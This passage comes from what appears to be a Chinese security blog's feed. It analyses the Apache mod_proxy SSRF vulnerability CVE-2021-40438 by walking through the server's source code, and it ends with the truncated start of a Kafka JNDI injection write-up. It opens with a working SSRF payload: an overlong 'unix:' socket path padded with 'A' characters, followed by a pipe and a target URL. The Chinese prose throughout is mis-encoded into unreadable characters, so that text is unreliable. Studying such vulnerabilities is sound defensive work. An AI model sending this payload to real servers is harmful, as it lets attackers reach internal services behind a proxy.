AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1/1.txt HTTP/1.1</span><br><span class="line">Host: 192.168.135.138</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7e4da682492fcc210e3b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e4da682492fcc210e3b.jpg"></a></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><blockquote><p>Apacheåœ¨é…ç½®åä»£çš„åç«¯æœåŠ¡å™¨æ—¶ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š</p><ul><li><p>ç›´æ¥ä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°æŸä¸ªIPå’Œç«¯å£ï¼Œæ¯”å¦‚<code>ProxyPass / &quot;http://localhost:8080&quot;</code></p></li><li><p>ä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°unixå¥—æ¥å­—ï¼Œæ¯”å¦‚<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code></p></li></ul><p>ç¬¬äºŒç§æƒ…å†µçš„è®¾è®¡æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆå¥½ï¼Œç›¸å½“äºè®©ç”¨æˆ·å¯ä»¥ä½¿ç”¨ä¸€ä¸ªApacheè‡ªåˆ›çš„å†™æ³•æ¥é…ç½®åç«¯åœ°å€ã€‚é‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šæ¶‰åŠåˆ°parseçš„è¿‡ç¨‹ï¼Œéœ€è¦å°†è¿™ç§è‡ªåˆ›çš„è¯­æ³•è½¬æ¢æˆèƒ½å…¼å®¹æ­£å¸¸socketè¿æ¥çš„ç»“æ„ï¼Œè€Œfix_uds_filenameå‡½æ•°å°±æ˜¯åšè¿™ä¸ªäº‹æƒ…çš„ã€‚</p><p><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></p></blockquote><p>æ¼æ´ç‚¹åœ¨modules&#x2F;proxy&#x2F;proxy_util.cçš„fix_uds_filenameå‡½æ•°å¤„ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7ec5a682492fcc21860f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ec5a682492fcc21860f.jpg"></a></p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“r-&gt;filenameæ˜¯ä»€ä¹ˆï¼Ÿå› ä¸ºåä»£åç«¯æ˜¯httpã€httpsåè®®çš„æœåŠ¡ï¼Œå› æ­¤æˆ‘ä»¬åœ¨modules&#x2F;proxy&#x2F;mod_proxy_http.cçš„ä¸­æ‰¾åˆ°å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proxy_http_canon</span><span class="params">(request_rec *r, <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *host, *path, sport[<span class="number">7</span>];</span><br><span class="line">    <span class="type">char</span> *search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *err;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *scheme;</span><br><span class="line">    <span class="type">apr_port_t</span> port, def_port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ap_port_of_scheme() */</span></span><br><span class="line">    <span class="keyword">if</span> (strncasecmp(url, <span class="string">&quot;http:&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        url += <span class="number">5</span>;</span><br><span class="line">        scheme = <span class="string">&quot;http&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strncasecmp(url, <span class="string">&quot;https:&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        url += <span class="number">6</span>;</span><br><span class="line">        scheme = <span class="string">&quot;https&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DECLINED;</span><br><span class="line">    &#125;</span><br><span class="line">    port = def_port = ap_proxy_port_of_scheme(scheme);</span><br><span class="line"></span><br><span class="line">    ap_log_rerror(APLOG_MARK, APLOG_TRACE1, <span class="number">0</span>, r,</span><br><span class="line">                  <span class="string">&quot;HTTP: canonicalising URL %s&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do syntatic check.</span></span><br><span class="line"><span class="comment">     * We break the URL into host, port, path, search</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    err = ap_proxy_canon_netloc(r-&gt;pool, &amp;url, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;host, &amp;port);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        ap_log_rerror(APLOG_MARK, APLOG_ERR, <span class="number">0</span>, r, APLOGNO(<span class="number">01083</span>)</span><br><span class="line">                      <span class="string">&quot;error parsing URL %s: %s&quot;</span>, url, err);</span><br><span class="line">        <span class="keyword">return</span> HTTP_BAD_REQUEST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now parse path/search args, according to rfc1738:</span></span><br><span class="line"><span class="comment">     * process the path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In a reverse proxy, our URL has been processed, so canonicalise</span></span><br><span class="line"><span class="comment">     * unless proxy-nocanon is set to say it&#x27;s raw</span></span><br><span class="line"><span class="comment">     * In a forward proxy, we have and MUST NOT MANGLE the original.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">switch</span> (r-&gt;proxyreq) &#123;</span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">/* wtf are we doing here? */</span></span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_REVERSE:</span><br><span class="line">        <span class="keyword">if</span> (apr_table_get(r-&gt;notes, <span class="string">&quot;proxy-nocanon&quot;</span>)) &#123;</span><br><span class="line">            path = url;   <span class="comment">/* this is the raw path */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            path = ap_proxy_canonenc(r-&gt;pool, url, <span class="built_in">strlen</span>(url),</span><br><span class="line">                                     enc_path, <span class="number">0</span>, r-&gt;proxyreq);</span><br><span class="line">            search = r-&gt;args;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_PROXY:</span><br><span class="line">        path = url;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> HTTP_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (port != def_port)</span><br><span class="line">        apr_snprintf(sport, <span class="keyword">sizeof</span>(sport), <span class="string">&quot;:%d&quot;</span>, port);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sport[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ap_strchr_c(host, <span class="string">&#x27;:&#x27;</span>)) &#123; <span class="comment">/* if literal IPv6 address */</span></span><br><span class="line">        host = apr_pstrcat(r-&gt;pool, <span class="string">&quot;[&quot;</span>, host, <span class="string">&quot;]&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="string">&quot;proxy:&quot;</span>, scheme, <span class="string">&quot;://&quot;</span>, host, sport,</span><br><span class="line">            <span class="string">&quot;/&quot;</span>, path, (search) ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&quot;</span>, (search) ? search : <span class="string">&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç å¯ä»¥å‘ç°ï¼Œé¦–å…ˆåˆ¤æ–­äº†urlæ˜¯å¦æ˜¯<code>http:</code>æˆ–<code>https:</code>ï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™è¿”å›-1ã€‚ä¹‹åï¼Œè¿˜è·å–äº†schemaå’Œportï¼Œæ¥ç€è°ƒç”¨ap_proxy_canon_netlocå‡½æ•°ï¼Œè‹¥å­˜åœ¨æŸäº›é”™è¯¯ï¼Œåˆ™å†™å…¥æ—¥å¿—ï¼Œå¹¶è¿”å›HTTP_BAD_REQUESTï¼Œä¹Ÿå°±æ˜¯400ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7edfa682492fcc219ce3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7edfa682492fcc219ce3.jpg"></a></p><p>æ¥ç€ä¾æ¬¡è·å–sportï¼Œpathï¼Œsearchï¼Œæœ€åè°ƒç”¨apr_pstrcatå‡½æ•°æ‹¼æ¥<code>proxy:</code>ã€schemeã€<code>://</code>ã€hostã€sportã€<code>/</code>ã€pathã€?ã€searchï¼Œå…¶ä¸­<code>?</code>æ˜¯å­˜åœ¨searchæ—¶æ‰ä¼šæ‹¼æ¥è¿›å»çš„ã€‚æœ€åå°†æ‹¼æ¥çš„å€¼èµ‹ç»™r-&gt;filenameã€‚</p><p>åœ¨modules&#x2F;proxy&#x2F;mod_proxy_http.cçš„111è¡Œæ‰“ä¸‹æ–­ç‚¹ï¼Œå‘é€payloadå¯ä»¥çœ‹åˆ°å¾—åˆ°çš„å˜é‡å€¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7ef2a682492fcc21aac4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ef2a682492fcc21aac4.jpg"></a></p><p>æ¥ç€ç¨‹åºèµ°åˆ°modules&#x2F;proxy&#x2F;proxy_util.cçš„fix_uds_filenameå‡½æ•°å¤„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fix_uds_filename</span><span class="params">(request_rec *r, <span class="type">char</span> **url)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *ptr2;</span><br><span class="line">    <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">            (ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">        <span class="type">apr_uri_t</span> urisock;</span><br><span class="line">        <span class="type">apr_status_t</span> rv;</span><br><span class="line">        *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">        <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">            <span class="type">char</span> *rurl = ptr+<span class="number">1</span>;</span><br><span class="line">            <span class="type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">            apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br><span class="line">            *url = apr_pstrdup(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">            <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">            memmove(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                    <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                    sockpath, *url, r-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­<code>r-&gt;filename</code>çš„æ˜¯å¦ç”±<code>proxy:</code>å¼€å¤´ï¼Œæ¥ç€åˆ¤æ–­<code>r-&gt;filename</code>çš„å­—ç¬¦ä¸²ä¸­å«æœ‰å…³é”®å­—<code>unix:</code>ï¼Œç„¶ååˆ¤æ–­<code>unix:</code>åæ˜¯å¦å«æœ‰<code>|</code>ã€‚</p><p>è‹¥æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æ‰§è¡Œapr_uri_parseå‡½æ•°ï¼Œrvç»“æœä¸º0ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f0aa682492fcc21c143.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f0aa682492fcc21c143.jpg"></a></p><p>è€ŒAPR_SUCCESSçš„å€¼ä¹Ÿä¸º0ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f1aa682492fcc21cfde.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f1aa682492fcc21cfde.jpg"></a></p><p>å› æ­¤æ»¡è¶³<code>rv == APR_SUCCESS</code>ï¼Œè¿›å…¥ifåˆ¤æ–­ã€‚ä¹‹åå°†<code>|</code>ä¹‹åçš„å€¼èµ‹å€¼ç»™rurlï¼Œå°†<code>unix:</code>åé¢çš„å†…å®¹è¿›è¡Œè§£æï¼Œè®¾ç½®æˆ<code>uds_path</code>çš„å€¼ã€‚å‡è®¾r-&gt;filenameä¸º<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code>ï¼Œé‚£ä¹ˆrurlä¸º<code>http://localhost:8080/</code>ï¼Œuds_pathä¸º<code>/var/run/www.sock</code>ã€‚</p><p>å‡è®¾å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:/var/run/test.sock|http://localhost:8080/ HTTP/1.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>logs&#x2F;error.logä¸­ä¼šå‡ºç°å¦‚ä¸‹å†…å®¹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f30a682492fcc21e39c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f30a682492fcc21e39c.jpg"></a></p><p>æç¤ºæˆ‘ä»¬æ‰¾ä¸åˆ°unixå¥—æ¥å­—<code>/var/run/test.sock</code>ã€‚ä½†æ˜¯è¯¥SSRFæ˜¯è®©å®ƒæŠŠè¯·æ±‚å‘é€ç»™<code>|</code>ä¹‹åçš„åœ°å€ï¼Œè¿™æ˜¯æ€ä¹ˆåšåˆ°å‘¢ï¼Ÿ</p><p>åœ¨<code>fix_uds_filename</code>å‡½æ•°ä¸­ï¼Œunixå¥—æ¥å­—çš„åœ°å€æ¥è‡ªäºä¸‹é¢è¿™ä¸¤è¡Œä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br></pre></td></tr></table></figure><p>è‹¥ap_runtime_dir_relativeå‡½æ•°è¿”å›nullï¼Œé‚£ä¹ˆåé¢å°†ä¼šå˜æˆæ™®é€šçš„TCPè¿æ¥ï¼Œå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f42a682492fcc21f4c8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f42a682492fcc21f4c8.jpg"></a></p><p>ap_runtime_dir_relativeå‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f50a682492fcc22031f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f50a682492fcc22031f.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬ä½¿å¾—ifä¸­çš„æ¡ä»¶ä¸æ»¡è¶³å°±ä¼šè¿”å›nullï¼Œå†è·Ÿè¿›ä¸€ä¸‹apr_filepath_mergeå‡½æ•°ï¼Œå…¶ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f62a682492fcc221348.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f62a682492fcc221348.jpg"></a></p><p>å…¶ä¸­APR_PATH_MAXçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7f70a682492fcc222246.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f70a682492fcc222246.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642c7f7da682492fcc222dd4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f7da682492fcc222dd4.jpg"></a></p><p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„<code>unix:</code>å’Œ<code>|</code>ä¹‹é—´çš„å†…å®¹è¶…è¿‡4092ï¼Œé‚£ä¹ˆapr_filepath_mergeå‡½æ•°å°±ä¼šè¿”å›APR_ENAMETOOLONGå¯¼è‡´ap_runtime_dir_relativeå‡½æ•°è¿”å›nullï¼Œä»è€Œä½¿å¾—<code>|</code>åçš„åœ°å€è¢«è¯·æ±‚ï¼Œé€ æˆSSRFã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-25194 Kafka JNDI Injection</title>
      <link href="/2023/04/04/kafkaJNDI/"/>
      <url>/2023/04/04/kafkaJNDI/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©æ‹œè¯»äº†4ra1nå¸ˆå‚…çš„<a href="https://articles.zsxq.com/id_52tr00657v3l.html">Kafka Connect RCE å¦‚ä½•æ£€æµ‹</a>ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ”¶è·ã€‚é‚å†³å®šå¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œåˆ†æï¼Œäº†è§£ä¸€ä¸‹æ¼æ´åŸç†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>POCå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 